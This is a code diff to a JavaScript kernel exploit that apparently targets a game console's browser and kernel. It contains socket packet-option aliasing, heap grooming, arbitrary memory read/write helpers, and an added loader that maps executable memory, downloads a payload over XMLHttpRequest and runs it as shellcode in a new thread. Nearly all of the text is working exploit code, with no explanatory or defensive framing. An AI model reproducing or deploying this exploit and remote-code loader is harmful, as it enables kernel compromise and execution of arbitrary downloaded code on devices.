@@ -961,7 +961,7 @@ function make_aliased_pktopts(sds) {
         for (let i = 0; i < num_sds; i++) {
             setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
         }
-        
+
         for (let i = 0; i < num_sds; i++) {
             tclass[0] = i;
             ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
@@ -1624,20 +1624,6 @@ function setup(block_fd) {
     }
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
 
-    {
-        const reqs1 = make_reqs1(1);
-        const timo = new Word(1);
-        const id = new Word();
-        aio_submit_cmd(AIO_CMD_READ, reqs1.addr, 1, id.addr);
-        chain.do_syscall_clear_errno(
-            'aio_multi_wait', id.addr, 1, _aio_errors_p, 1, timo.addr);
-        const err = chain.errno;
-        if (err !== 60) { // ETIMEDOUT
-            die(`SceAIO system not blocked. errno: ${err}`);
-        }
-        free_aios(id.addr, 1);
-    }
-
     log('heap grooming');
     // chosen to maximize the number of 0x80 malloc allocs per submission
     const num_reqs = 3;
@@ -1797,44 +1783,55 @@ export async function kexploit() {
     }
 }
 
-
 function malloc(sz) {
-        var backing = new Uint8Array(0x10000 + sz);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = backing;
-        return ptr;
-    }
+    var backing = new Uint8Array(0x10000 + sz);
+    nogc.push(backing);
+    var ptr = mem.readp(mem.addrof(backing).add(0x10));
+    ptr.backing = backing;
+    return ptr;
+}
 
-    function malloc32(sz) {
-        var backing = new Uint8Array(0x10000 + sz * 4);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = new Uint32Array(backing.buffer);
-        return ptr;
-    }
+function malloc32(sz) {
+    var backing = new Uint8Array(0x10000 + sz * 4);
+    nogc.push(backing);
+    var ptr = mem.readp(mem.addrof(backing).add(0x10));
+    ptr.backing = new Uint32Array(backing.buffer);
+    return ptr;
+}
 
+function array_from_address(addr, size) {
+    var og_array = new Uint32Array(0x1000);
+    var og_array_i = mem.addrof(og_array).add(0x10);
+    mem.write64(og_array_i, addr);
+    mem.write32(og_array_i.add(0x8), size);
+    mem.write32(og_array_i.add(0xC), 0x1);
+    nogc.push(og_array);
+    return og_array;
+}
 
 kexploit().then(() => {
-    
-    window.pld_size = new Int(0x26200000, 0x9);
 
-    var payload_buffer = chain.sysp('mmap', window.pld_size, 0x300000, 7, 0x41000, -1, 0);
-    var payload = window.pld;
-    var bufLen = payload.length * 5
-    var payload_loader = malloc32(bufLen);
-    var loader_writer = payload_loader.backing;
-    for (var i = 0; i < payload.length; i++) {
-        loader_writer[i] = payload[i];
-    }
-    chain.sys('mprotect', payload_loader, bufLen, (0x1 | 0x2 | 0x4));
-    var pthread = malloc(0x10);
+    var loader_addr = chain.sysp('mmap', 0, 0x1000, 7, 0x41000, -1, 0);
+    var tmpStubArray = array_from_address(loader_addr, 1);
+    tmpStubArray[0] = 0x00C3E7FF;
+    var req = new XMLHttpRequest();
+    req.responseType = "arraybuffer";
+    req.open('GET', window.payload_path);
+    req.send();
+    req.onreadystatechange = function () {
+     if (req.readyState == 4) {
+      var PLD = req.response;
+      var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength*4, 7, 0x1002, -1, 0);
+      var pl = array_from_address(payload_buffer, PLD.byteLength*4);
+      var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+      var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+      tmp.set(new Uint8Array(req.response), 0);
+      tmp.set(padding, req.response.byteLength);
+      var shellcode = new Uint32Array(tmp.buffer);
+      pl.set(shellcode,0);
+      var pthread = malloc(0x10);
+      call_nze('pthread_create', pthread, 0, loader_addr, payload_buffer);
+      }
+   };
 
-    call_nze(
-        'pthread_create',
-        pthread,
-        0,
-        payload_loader,
-        payload_buffer,
-    );
 })
